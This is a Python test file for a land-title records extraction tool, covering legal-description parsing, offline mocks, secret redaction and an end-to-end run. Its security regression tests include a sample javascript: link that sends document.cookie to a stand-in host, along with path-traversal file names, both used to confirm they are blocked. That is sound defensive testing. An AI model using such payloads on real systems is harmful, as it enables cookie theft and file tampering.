"""
Tests for the v2 capabilities: domain intelligence, offline mode, provenance
(hashing / redaction / secret scanning / manifest), and a full end-to-end
offline pipeline run of run_job().
"""

import glob
import json
import os
import shutil
import sys

from openpyxl import load_workbook

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest

import domain
import drive_sync
import offline
import provenance
import report as report_mod


# --------------------------------------------------------------------------- #
# domain
# --------------------------------------------------------------------------- #
def test_parse_tract():
    assert domain.parse_tract("31-12N-24W_Roger_Mills_Cursory.xlsx") == "31-12N-24W"
    assert domain.parse_tract("nothing here") is None


def test_parse_legal():
    p = domain.parse_legal("NW/4 of Section 31, Township 12N, Range 24W")
    assert p.sections == ["31"]
    assert p.township == "12N"
    assert p.range == "24W"
    assert "NW4" in p.quarters


def test_audit_section_out_of_range():
    warns = domain.audit({"section": "75"}, {})
    assert any("out of range" in w for w in warns)


def test_audit_future_date():
    import datetime as dt
    warns = domain.audit({"filed_date": "2099-01-01"}, {},
                         today=dt.date(2026, 6, 18))
    assert any("future" in w for w in warns)


def test_audit_township_mismatch_vs_legal():
    rec = {"legal_description": "NW/4 Sec 31 Twp 12N Rng 24W", "township": "11N"}
    warns = domain.audit(rec, {})
    assert any("township" in w for w in warns)


def test_audit_clean_record_no_warnings():
    rec = {"section": "31", "township": "12N", "range": "24W",
           "legal_description": "NW/4 of Section 31, Township 12N, Range 24W",
           "document_type": "Warranty Deed", "filed_date": "2020-01-01"}
    assert domain.audit(rec, {}, tract="31-12N-24W") == []


# --------------------------------------------------------------------------- #
# offline mocks
# --------------------------------------------------------------------------- #
def test_demo_truth_is_deterministic():
    assert offline.demo_truth(3) == offline.demo_truth(3)
    assert offline.demo_truth(3)["section"] == "31"


def test_mock_viewer_fail_and_ok():
    mv = offline.MockViewer({})
    # row 5 -> plan link_fails True
    assert mv.capture_document("x", row_id=5)["ok"] is False
    ok = mv.capture_document("x", row_id=6)
    assert ok["ok"] and ok["images"] and isinstance(ok["images"][0], bytes)


def test_mock_router_shape():
    r = offline.MockRouter({})
    out = r.extract([b"img"], row_id=6)
    assert set(out) >= {"primary", "consensus", "consensus_fields",
                        "disagree_fields", "confidence", "needs_human_review"}
    assert out["primary"].county == "Roger Mills"


def test_make_demo_workbook(tmp_path):
    p = offline.make_demo_workbook(str(tmp_path / "demo.xlsx"))
    wb = load_workbook(p)
    ws = wb["Runsheet"]
    assert ws.cell(row=1, column=1).value == "Instrument #"
    assert ws.cell(row=2, column=12).hyperlink is not None


# --------------------------------------------------------------------------- #
# provenance
# --------------------------------------------------------------------------- #
def test_sha256_file(tmp_path):
    f = tmp_path / "a.txt"
    f.write_text("hello")
    assert len(provenance.sha256_file(str(f))) == 64
    assert provenance.sha256_file(str(tmp_path / "missing")) is None


def test_redact_masks_keys():
    s = "key=sk-ABCD1234567890ABCD1234 and AIzaSyABCDEFGHIJKLMNOPQRSTUVWXYZ012345"
    out = provenance.redact(s)
    assert "sk-ABCD" not in out and "AIza" not in out
    assert "[REDACTED]" in out


def test_scan_and_safe_upload(tmp_path):
    bad = tmp_path / "leak.txt"
    bad.write_text("token: sk-ABCD1234567890ABCD1234XYZ")
    good = tmp_path / "ok.csv"
    good.write_text("row,status\n2,ok\n")
    binary = tmp_path / "wb.xlsx"
    binary.write_bytes(b"PK\x03\x04 not really but binary ext")
    assert provenance.scan_file_for_secrets(str(bad))
    assert not provenance.scan_file_for_secrets(str(good))
    safe, blocked = provenance.safe_upload_list([str(bad), str(good), str(binary)])
    assert str(good) in safe and str(binary) in safe
    assert any(str(bad) == b[0] for b in blocked)


# --------------------------------------------------------------------------- #
# security regressions
# --------------------------------------------------------------------------- #
def _report_html_for_link(tmp_path, link):
    rows = [{"sheet": "S", "row": 2, "status": "ok", "confidence": 0.9,
             "consensus_label": "", "changed_fields": [], "review_needed": False,
             "viewer_method": "image", "notes": "", "color": "green", "link": link}]
    out = report_mod.build_report(str(tmp_path / "r.html"), "wb", "t",
                                  {"linked_rows": 1}, rows, total_cost=0.0)
    return open(out, encoding="utf-8").read()


def test_report_suppresses_javascript_link(tmp_path):
    # A malicious hyperlink from an untrusted workbook must NOT become clickable.
    h = _report_html_for_link(tmp_path, "javascript:fetch('//evil/'+document.cookie)")
    assert 'href="javascript:' not in h
    assert "non-web link suppressed" in h


def test_report_allows_https_link(tmp_path):
    h = _report_html_for_link(tmp_path, "https://county.example.com/doc/1")
    assert 'href="https://county.example.com/doc/1"' in h
    assert 'rel="noopener noreferrer"' in h


def test_drive_safe_basename_blocks_traversal():
    assert drive_sync._safe_basename("report.xlsx") == "report.xlsx"
    for bad in ("../../etc/evil.xlsx", "../x.xlsx", "a/b/c.xlsx",
                "..\\..\\win.xlsx", ".."):
        with pytest.raises(ValueError):
            drive_sync._safe_basename(bad)


def test_build_manifest(tmp_path):
    src = tmp_path / "src.xlsx"
    src.write_bytes(b"abc")
    rev = tmp_path / "rev.xlsx"
    rev.write_bytes(b"def")
    path = provenance.build_manifest(
        str(tmp_path / "m.json"),
        config={"openai_model": "gpt-5.2", "OPENAI_API_KEY": "sk-secret-shh"},
        offline=True, source_path=str(src), review_path=str(rev),
        summary={"linked_rows": 3}, cost_usd=0.12,
        models={"openai": "gpt-5.2"}, started="a", ended="b",
        outputs=[str(rev)])
    m = json.load(open(path))
    assert m["version"] == provenance.__version__
    assert m["summary"]["linked_rows"] == 3
    # config secrets must be redacted in the manifest
    assert m["config_snapshot"]["OPENAI_API_KEY"] == "[REDACTED]"


# --------------------------------------------------------------------------- #
# full end-to-end offline run of run_job()
# --------------------------------------------------------------------------- #
def test_offline_end_to_end(tmp_path, monkeypatch):
    import title_link_extractor as t

    proj = tmp_path
    for d in ("input", "output", "logs", "temp", "debug", ".auth", ".cache"):
        (proj / d).mkdir()
    shutil.copy(os.path.join(os.path.dirname(t.__file__), "config.yaml"),
                str(proj / "config.yaml"))

    paths = {
        "HERE": str(proj), "CONFIG_PATH": str(proj / "config.yaml"),
        "INPUT_DIR": str(proj / "input"), "OUTPUT_DIR": str(proj / "output"),
        "LOGS_DIR": str(proj / "logs"), "TEMP_DIR": str(proj / "temp"),
        "DEBUG_DIR": str(proj / "debug"),
        "RUN_LOG": str(proj / "logs" / "run_log.csv"),
        "SUMMARY_LOG": str(proj / "logs" / "summary.csv"),
        "ERRORS_LOG": str(proj / "logs" / "errors.log"),
        "EVENTS_LOG": str(proj / "logs" / "events.jsonl"),
        "MANIFEST": str(proj / "logs" / "run_manifest.json"),
    }
    for k, v in paths.items():
        monkeypatch.setattr(t, k, v)
    for env in ("GOOGLE_DRIVE_LOCAL_SYNC_PATH", "GOOGLE_OAUTH_CLIENT_SECRET_JSON",
                "GOOGLE_APPLICATION_CREDENTIALS"):
        monkeypatch.delenv(env, raising=False)

    rc = t.run_job(test_mode=False, offline=True)
    assert rc == 0

    review = glob.glob(str(proj / "output" / "*_AI_REVIEW_*.xlsx"))
    assert review, "review workbook not produced"
    assert glob.glob(str(proj / "output" / "*_REPORT.html"))
    assert os.path.exists(paths["MANIFEST"])
    assert os.path.exists(paths["EVENTS_LOG"])

    m = json.load(open(paths["MANIFEST"]))
    s = m["summary"]
    # crafted demo distribution: 12 linked, 2 failed links, 1 skipped, 4 changed
    assert s["linked_rows"] == 12
    assert s["failed_rows"] == 2
    assert s["skipped_rows"] == 1
    assert s["changed_rows"] == 4

    # original cell must be untouched (review-only), AI columns present
    wb = load_workbook(review[0])
    ws = wb["Runsheet"]
    hdr = {ws.cell(row=1, column=c).value: c for c in range(1, ws.max_column + 1)}
    assert "AI Status" in hdr and "AI Suggested Grantor" in hdr
    # a green row's grantor equals the AI reading (clean match)
    assert ws.cell(row=6, column=hdr["AI Status"]).value == "ok"
